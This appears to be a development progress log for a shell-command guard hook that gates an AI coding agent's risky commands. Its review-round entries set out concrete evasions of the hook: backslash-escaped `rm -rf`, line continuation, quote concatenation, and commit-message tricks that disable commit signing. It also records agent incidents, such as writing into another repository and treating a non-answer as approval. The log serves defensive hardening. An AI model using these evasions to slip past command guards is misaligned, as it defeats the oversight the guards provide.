  bounded **all six** gaps to `{0,200}`; Security and Correctness independently found that in
  `git (<gap>)--no-gpg-sign` the gap holds the COMMIT MESSAGE, so any message over ~185 chars
  silently defeated the CONFIRM on both shells. **The generalisation was the error** — "real gaps are
  tiny" is true of the `config` gaps and false of the message gap. Corrected by measuring per pattern:
  only the nested pair blows up, so only those four are bounded.
- 🔴 **My bash timing assertion was a TAUTOLOGY** — `assert_contains "fast" "fast"`. Reverting all six bounds left the suite green at 108/0. GNU grep is a DFA and never gets slow; I had *said* so aloud, wrote the assertion anyway, and counted it in "every new assertion was confirmed to discriminate". I proved the REGEX discriminates, never the ASSERTION. **This violated the Evidence Integrity rule in the same diff that introduces it.** Replaced with a structural invariant. The Pester timing test dropped 50,000 → 8,000 chars: at 50,000 a regression takes ~3 HOURS, i.e. hangs CI rather than failing it.
- 🔴 **F4's premise was wrong too: `${#cmd}` counts CHARACTERS PER LOCALE, not bytes.** So moving ps1
  to `UTF8.GetByteCount` INVERTED the divergence rather than closing it, and the assertion failed
  under `C.UTF-8`/`en_US.UTF-8` — CI's locales. sh now uses `wc -c`; asserted across three locales.
- ✅ **F5 (non-discriminating tab test) fixed by deleting redundant CODE, not rewriting the test.**
  Neutering the sole fold site turns 2 assertions red. A sweep also found 2 pre-existing parity
  assertions and 2 new sanity checks that still cannot fail — open, not fixed.
- ✅ **Coverage after round 8:** sh 99 → 117, Pester 49 → 55, every new assertion mutation-proved.
  **The canary earned its place** — the harness first reported four false "non-discriminating"
  verdicts because `bash` resolved to a WSL stub; only the canary failing too revealed the fault.
- 📌 **The lesson: a claim in a comment stronger than the code delivers.** "Measured 2/2 correct",
  "zero semantic change", "agree by construction", "confirmed to discriminate" — each falsified by a
  single probe a reader could have run.

### Round 9, first three domains (2026-08-24) — completed 2026-08-25, see the section above

Security, Correctness and a Testing-equivalent pass ran this day under the new remediation rule
(**only a demonstrated live bypass earns code; everything else becomes a documented limit**). The
remaining three domains plus Opposition ran 2026-08-25 and the outcome is recorded there; only what
these three found is kept here.

- 🔴 **The gap character class was ITSELF a live bypass** — the sharpest finding of any round, reached
  independently by two domains. Gaps were `[^|;&]*`, so any `|`, `;` or `&` between `git` and the flag
  made a pattern unmatchable — and in the `-c` and `--no-gpg-sign` patterns that gap holds the COMMIT
  MESSAGE. Verified allowed with no prompt on both shells: `git commit -m "docs: R&D notes"
  --no-gpg-sign`. An ampersand in English prose is not evasion. **And the class never did its job**:
  newline was never excluded, so the gap already spanned commands.
- ✅ Fixed to `.*` on those two patterns. `[^newline]` is not portable — a literal newline inside a
  grep pattern SPLITS it into two patterns, measured — so `.*` plus .NET `Singleline` is what makes
  the engines agree. That flag is the **third** instance of this file's line-vs-string mismatch
  (`sed` vs `-replace`, `grep` vs `-imatch`, now `.` vs `.`), fixed in the same change that would
  have exposed it — which is what `confirm_regex()`'s comment asked for.
- 🔴 **Two PRE-EXISTING BLOCK-tier evasions found and filed as separate tasks** (sh case-sensitivity;
  pipe-newline continuation). Detail in the 2026-08-25 section.

## 2026-08-24 (continued) — Review Round 7 — condensed; all five findings superseded by rounds 8-9

Round 7 returned Request Changes with five blocking findings. **All are recorded in full at their
point of resolution in the rounds 8-9 entry above, which also corrects two of round 7's own claims** —
so this section is condensed to the durable facts rather than repeated.

- 🔴 **CRITICAL, PRE-EXISTING: the sh hook's python3 extraction ran text-mode I/O under Windows
  `cp1252`, so any non-ASCII command silently degraded to raw-stdin matching** — the exact
  false-positive mode the extraction exists to prevent. A CJK payload made sh DENY with "command is
  120057 characters" (the byte length of the whole JSON file) while the ps1 twin allowed it: opposite
  verdicts on ordinary input. NOT introduced by this branch. Round 8 found the proposed fix was
  proven against only one payload shape; see above.
- 🔴 The de-escaped-view retrofit reached four of five matcher functions — `confirm_boundary()` had
  zero `cmd_loose` references, so `git m\erge main` was SILENT in sh and CONFIRM in ps1.
  **Why the mutation proof missed it:** removing `cmd_loose` turned the S1 test red, proving the
  mechanism works WHERE WIRED, which says nothing about whether every matcher is wired.
  **Coverage failures wear correctness clothing** — the cheap guard is a COMPLETENESS invariant,
  a different tool from a discrimination check.
- 🔴 The de-escaped view doubled the worst-case stall and the accompanying comment understated it;
  the length-bound units diverged (bash bytes vs .NET UTF-16). Both re-measured and corrected in
  rounds 8-9 — round 7's own figures turned out to be measured on the wrong payload shape.
- 🔴 **A whitespace-collapse made a PRE-EXISTING tab test non-discriminating**: neutering the original
  `tr`/`.Replace` left the payload byte-identically CONFIRMed, so the NBSP platform-parity regression
  guard was silently gone. No live bypass, but this is the Failure Criterion added to
  `standards/CODE-REVIEW.md` in the same diff. Fixed in round 8 by deleting the redundant path.
- ✅ Testing independently re-ran the mutation proof and confirmed it, and verified
  `PMB_REQUIRE_PARITY=1` hard-fails when pwsh is absent. **Stated caveat: no exhaustive assertion
  sweep** — round 8's sweep then found further non-discriminating assertions.
- 📌 **Third instance of coverage-not-correctness, and a new sub-shape:** adding a redundant
  normalization path silently DISARMS an existing guard without failing it. Mutation testing catches
  a test that never guarded anything; it does not catch a test whose guard migrated elsewhere.

## 2026-08-24 — Review Round 6: One Blocker, Two Pre-Existing Bypasses Closed, Cap Metric Fixed

- 📌 **Verdict: Request Changes — but a different shape of failure from rounds 1-5.** Six domain
  agents plus Opposition (Opus). Eight findings arrived `Blocking: true`; Opposition downgraded
  seven on counter-evidence and **refuted one outright**. Rounds 1-5 each found a NEW live bypass
  introduced by the change; round 6 found none. Measured against `HEAD`, the change closes two
  bypasses `main` still has and introduces zero.
- 🔴 **C1, the sole surviving blocker — and the second time this exact mismatch shipped in this
  file.** `confirm_regex`'s `grep` is line-based; the `.ps1` twin's `-imatch` is not. So
  `git commit -m "<two-line message>" --no-gpg-sign` passed silently in sh and denied in ps1.
  `CHANGELOG.md:44` records that round 4's argument-stripping was withdrawn *because* `sed` is
  line-based while .NET `-replace` is not — the replacement reintroduced the identical defect one
  function over. Fixed with `grep -z`; noted in-code so a third instance is harder to write.
- ✅ **Two PRE-EXISTING bypasses closed (S1, S3), both outside the four documented KNOWN LIMITS.**
  A shell strips a backslash before ANY character, so `r\m -r\f` runs as `rm -rf` — that defeated
  the BLOCK tier outright and pre-dates the signing work. Adjacent quoted segments concatenate, so
  `git config "commit."'gpgsign' false` evaded CONFIRM. Both closed by matching every tier against
  a second, deliberately de-escaped view in addition to the faithful one — strictly fail-closed,
  it can only add matches. Cost documented, not hidden: `echo "rm" "-rf"` now trips BLOCK.
- 📌 **S4/S5 are NOT fixable and are documented instead.** Command substitution
  (`commit.gpgsign $(echo false)`) and variable indirection (`K=...; git config "$K" false`) need
  the shell EVALUATED, not read. Patterns that appeared to cover them would be a false claim of
  coverage — the failure the KNOWN LIMITS block exists to prevent.
- 🔴 **The round-5 "doubled backslash fail-closed" test could not fail.** It left `rm -rf` intact
  on line 2, where newline-insensitive substring matching found it whether the join worked, broke,
  or was deleted. It was written *while* `verification-before-completion` was being invoked, and it
  survived a substantial rewrite of the join without going red. Found by review, not by the suite.
- ✅ **Every replacement mutation-proved.** Removing the join, the de-escaped view, `grep -z`, or
  the length bound each turns its guarding assertion red. Two traps hit while proving it, both now
  written into `standards/CODE-REVIEW.md`: a mutation that changes BYTES has not necessarily changed
  BEHAVIOUR (an inert mutator produced a false "test doesn't guard this"), and redundant match paths
  mask mutations (the de-escaped view answered while the mutated path was disabled).
- ✅ **`standards/CODE-REVIEW.md` gains an Evidence Integrity section:** a check that cannot fail
  does not count, and a self-attested completion counts as UNMET — worse than an admitted gap.
  Mutation testing was already PMB practice (three uses recorded here) but was undocumented
  folklore with no tooling; `tests/helpers/` has `assert.sh` and `stub-pwsh.sh` and nothing else.
  Tooling deliberately NOT built under a Request-Changes cycle — spun off as its own spec task.
- ✅ **P3/P1: input length bound at 50,000 chars, fail-closed.** Two CONFIRM regexes go quadratic
  under .NET backtracking (measured: 35 KB→3.9s, 140 KB→53.7s, 350 KB→no finish in 180s; GNU grep
  stayed flat). It REFUSES rather than truncating — truncation is fail-open, since a dangerous
  substring straddling the cut would vanish. Applied identically in both shells on purpose.
- ✅ **The line cap was the wrong metric and is now raised 400 → 600.** At 400 the file was 39,590
  bytes against a 48,000 WARN — the line cap bound first, which is the dimension `[NS-28]` already
  identified as wrong. Not theoretical: round 5's findings were written under round 4's heading for
  lack of room, and a 34-line relocation was absorbed by one subsequent entry. Byte WARN now fires
  first. Earlier the same session this was declined as the user-as-bypass shape; that objection was
  to AUTHORIZATION, not the technical case, and the user directed it explicitly.
- 📌 **Docs corrected:** `HOOKS-GUIDE.md` claimed the `mb validate` shim exits 0 (it exits 2 — the
  code was fixed in the same change, the doc was not); the KNOWN LIMITS block listed one of three
  accepted false positives and misstated the `GIT_CONFIG_*` cause (the anchor token is absent
  entirely, not merely mis-positioned); `activeContext.md` said the relocation ended at 392/400
  where `progress.md` said 372 — 372 is correct, 392 was the post-entry figure.
- 📌 **External evaluation — the `Unlazy` skill (gates ledger).** Adopted: the self-attestation rule
  only. Rejected: task tree, depth number, solo/orchestrated modes, parallel dispatch — PMB's
  bottleneck is verification integrity, not throughput, and `[NS-24]` Task #33 was deferred
  precisely to avoid a third overlapping mechanism. Key limitation recorded: a gates file proves a
  command RAN and matched text, which would NOT have caught the vacuous test above.
- **State:** 19 suites / 423 assertions / 0 failures; `test-dangerous-commands.sh` 99/0; Pester
  49/0; PSScriptAnalyzer 0 across 23 files; five mirror pairs byte-identical; `HOOKS-GUIDE` trim
  intact (318/289). Contract at 26 files. Round 7 not yet run.

## 2026-08-23 — Review Round 4: A Pre-Existing Critical, and a Fix Withdrawn

- 🔴 **Backslash line-continuation defeated the whole hook — present since v1, missed by three rounds.**
  The shell strips `\`+newline before git sees it, so a wrapped command ran as its one-line form while
  the hook matched raw two-line text. Verified live: `commit.gpgsign` `true`→`false`, no prompt. Not
  signing-specific — wrapped `git push --force` evaded BLOCK too. Took 3 attempts: substituting a space
  shipped 2 more bypasses (mid-token splits), so the join deletes + collapses. Quoted keys also ungated.
- 📌 **Round-3's argument-stripping was withdrawn** (user call). Making the hook's view differ from what
  the shell runs cost two defects — `sed` line-based vs .NET not, and unquoted multi-word args
  half-stripped — to buy 1 of 4 false positives anchoring already fixed; the 4th is a KNOWN LIMIT now.
- 📌 **`mb validate` exits 2, not 0** — old Check 7 emitted a permanent false `[WARN]`, not a false
  `[OK]`; wrong in code, here, and `activeContext.md`, now fixed in all three. Seen on ACR (1.1.1);
  `pre-push-check.*` is TEMPLATE_OWNED, so landing this branch ships the fix. `[NS-25]` hit twelve.

## 2026-08-23 (continued) — Cap Deadlock Cleared by Relocation; Round-6 Pre-Gate Hardening

- ✅ **Four non-chronological sections relocated verbatim** to
  `docs/archive/progress-reference-sections-2026-08-23.md` (What's In This Fork, Removed vs Enterprise,
  Earlier Sessions 06-19/24, Satellite Projects — 34 lines). 400/400 → 372/400. No condensation, no
  dated entry touched; verified zero body-line loss. `## Backlog` retained — still actionable.
- 📌 **A chronological archive pass was considered and rejected on evidence.** Every large dated section
  is cited by a live `[NS-N]` (08-12/14 → NS-16/17, 08-17 → NS-14/23, 08-18 → NS-24, 08-19 → NS-25/26,
  08-20 → NS-24, 08-20/21 → NS-32), so evicting one forces citation rewrites into `activeContext.md`,
  a second capped file with ~25 lines spare — the pass propagates edits into the file it relieves. The
  only uncited dated section was 08-22, this branch's own work.
- 🔴 **The cap distorts the record, not just constrains it.** Round 5's findings were folded under the
  `Review Round 4` heading because no room existed for a new section, so no separate R5 record exists.
  Primary evidence for `[NS-35]`: `[NS-28]` already found the line cap measures the wrong dimension and
  bytes (39,539/60,000) were never binding. Re-baselining was argued and **declined for now** —
  changing a guardrail while blocked by it is the user-as-bypass shape.
- 📌 **One-time recovery, not a fix.** Growth-vs-eviction asymmetry untouched; `[NS-35]` decision 3
  (entry lifecycle, deterministic merge/prune) stays open, deliberately not settled under a deadline.
  Contract re-proposed and approved at 21 files.
- ✅ **Round-6 pre-gate hardening — two defects fixed before spending a review round.** A stale comment
  in all four `dangerous-commands.{sh,ps1}` copies prescribed the *withdrawn* space-substituting join —
  the round-5 mid-token bypass — contradicting a correct comment ten lines below it, in a TEMPLATE_OWNED
  file that `mb upgrade` pushes downstream; the ps1 also misquoted the sh awk rule. Six parked join edge
  cases now tested in both shells, four routed via `assert_parity` (closing "join tested per-shell only").
  418 assertions / Pester 45 / PSA 0-of-23 / mirrors intact. Doubled-backslash divergence traced and
  confirmed **fail-closed** — no hidden Critical. Round 6 not yet run.

## 2026-08-22 — Commit-Signing CONFIRM Tier; Two Review-Driven Corrections; Midnight Gate-Expiry Found

- ✅ **Signing bypass is now CONFIRM-tier in both shells** (`[NS-25]`-adjacent, reported from ACR against
  PMB 1.1.1, re-verified against 1.2.1). `gpgsign` appeared nowhere in `scripts/`, `templates/`, or
  `.claude/settings.json` while the hook-skip flag was already gated. Three regexes shared
  byte-identically across `.sh`/`.ps1`, restricted to the subset valid in both GNU ERE and .NET.
  New `confirm_regex()` on the sh side; the ps1 CONFIRM loop already supported a regex flag.
- 📌 **The incoming brief's part (a) was declined as already-done** — `dangerous-commands.ps1:146` has
  carried the same ternary as the BLOCK loop since 1.2.1. Its recommended pattern was also incomplete
  twice over, found by testing real `git`: the falsey set is `false|0|no|off`, not `false|0`, and keys
  and values are both case-insensitive, so a case-sensitive match is a one-keystroke bypass.
- 🔴 **Gate rejection #1 — literals missed the persistent form.** The first implementation covered only
  `-c key=value`; `git config commit.gpgsign false`, `--global`, `--system` and `--unset` were all
  ungated. Three domains reproduced it independently. The test suite had a negative control using the
  space-separated syntax for the truthy value but never the falsey counterpart — the coverage gap had
  a matching test gap, which is why the TDD pass missed it.
- 🔴 **Gate rejection #2 (self-caught) — the regex fired on prose.** Matching the key anywhere made
  `echo`, `grep`, a trailing comment, and a sentence where "no" came from "no longer" all trip a
  CONFIRM. Each pattern now requires `(^|[^a-z])git ([^|;&]*)` — leading boundary so `legit config`
  does not match, separator class so the key cannot trail across a pipe. **The leading boundary
  survives; the separator class did NOT** — it was found to be a live bypass in round 9 and removed
  from every gap (2026-08-24/25 entries). Retained as the record of what was decided then. Known limit documented in
  code: a command quoting a git invocation as text still matches.
- 🔴 **NEW — the PreCompact gate expires silently at local midnight.** `pre-compact-check.sh` Check 2
  requires a `progress.md` entry dated today. This session crossed midnight, so the identical repo
  state that passed on 2026-08-21 failed on 2026-08-22, with `handoff.md` deleted and therefore no
  bypass — the compaction safety net was off and nothing announced it. Same shape as `493dfa5`'s
  session-crossed-midnight dating error, recurring in gating rather than dating. Tracked as `[NS-34]`.
- 📌 **`[NS-25]` escalation:** eleven documented instances, seven during this task alone — a read-only
  `grep`, the task contract *documenting the fix*, a heredoc writing test fixtures, and the hook's own
  test-harness pipe idiom (`printf | bash scripts/dangerous-commands.sh` trips the `|bash` BLOCK rule).
  Every workaround was identical: move the text into a file, pass a path.

## 2026-08-12 — Fleet Version Drift Incident (reported, not yet fixed)

- 📌 ACR drifted 2 versions behind PMB and ran a 13-task feature under stale governance hooks before
  it was caught; still unfixed. Current state: `activeContext.md`'s `[NS-14]`.

## Earlier Work (2026-07-02 through 2026-08-10) — condensed, full detail archived

- **2026-07-16 through 2026-08-05 — Review-gate mechanism evolution**: self-attestation fix (marker-write
  moved into the last dispatched review subagent), a false-positive fix in `review-reminders.sh`'s
  command matching, the confirm-step redesign (durable `docs/review-log/` + user-confirmed marker write),
  a worktree-root-resolution fix (closed a real denial-from-inside-a-worktree bug), a hook-lib dedup
  (`_review-gate-lib.sh`/`.ps1`), and the confirm-step's first live whole-branch review (found and fixed
  one real Blocking finding). Full detail: `docs/archive/progress-2026-07-review-gate-evolution.md`.
- **2026-07-02 through 2026-07-13 — Repo governance, CI hardening, branch protection**: `mb upgrade`
  slash-command auto-discovery fixes, 4 pre-existing CI failures closed (SAST config, 2 false-positive
  greps, PowerShell lint), CI hardening across 3 downstream repos, branch protection rolled out to 5
  public repos, a real hash byte-mismatch bug fixed (bash vs. PowerShell diverged on trailing-newline
  handling), the cross-repo write boundary hook built after a real incident (this session wrote into
  another repo's working directory without checking ownership), and the review-flow fleet audit (found
  real enforcement in only 2 of 11 repos). Full detail:
  `docs/archive/progress-2026-07-repo-governance-and-ci.md`.
- **2026-07-14, 2026-07-23 — `mb backlog` Task 1 + mb update-notifier**: `mb backlog`'s Task 1 shipped
  with two real Critical/High security bugs found and fixed (path traversal, sed-delimiter injection);
  Tasks 2-5 not started (`[NS-0]`). The update-notifier shipped clean, but the same session produced an
  authorization-drift incident (a "what do you suggest" non-answer treated as merge approval) that
  produced the "What Counts as Approval" rule. Full detail:
  `docs/archive/progress-2026-07-mb-backlog-and-notifier.md`.
- **2026-08-08, 2026-08-10 — Concurrent session claims + memory-bank freshness hook**: session-claims
  shipped (13 tasks + 5 post-review fixes, including one found only by a final whole-branch review after
  every individual task had already passed its own two-stage review); the freshness-hook spec was
  designed and committed but not yet implemented (`[NS-13]`). Full detail:
  `docs/archive/progress-2026-08-freshness-and-session-claims.md`.

## Backlog

Deferred pending operational evidence: handoff CLI, pinned.md, mb update --from-git, mb privacy.

## Reference Sections — relocated 2026-08-23

Project inventory, scope-delta vs enterprise, the 2026-06-19/24 session summary, and satellite-project
pointers moved **verbatim** to `docs/archive/progress-reference-sections-2026-08-23.md` to recover line
headroom under the 400-line CI cap. Nothing was condensed or rewritten. `## Backlog` stays above because
it is still actionable. One-time recovery, not a fix — see `[NS-35]` decision 3.
